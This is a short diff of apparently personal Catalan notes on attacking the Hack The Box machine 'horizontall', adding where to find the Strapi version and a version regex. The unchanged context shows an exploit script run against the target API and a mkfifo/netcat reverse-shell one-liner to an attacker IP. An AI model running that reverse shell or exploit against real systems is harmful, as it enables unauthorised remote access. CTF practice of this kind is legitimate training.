@@ -28,3 +28,10 @@ python script.py http://api-prod.horizontall.htb/
 COMANDA PER OBRIR UN TERMINAL REMOT CAP AL NOSTRE HOST:
 
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.18 3535 >/tmp/f
+
+Per trobar la versio dstrapi en el codi:
+
+api-prod..../admin/init -> tambe hi ha la versio de l'strapi
+
+strapi.*[123]\.[0]\.\d
+
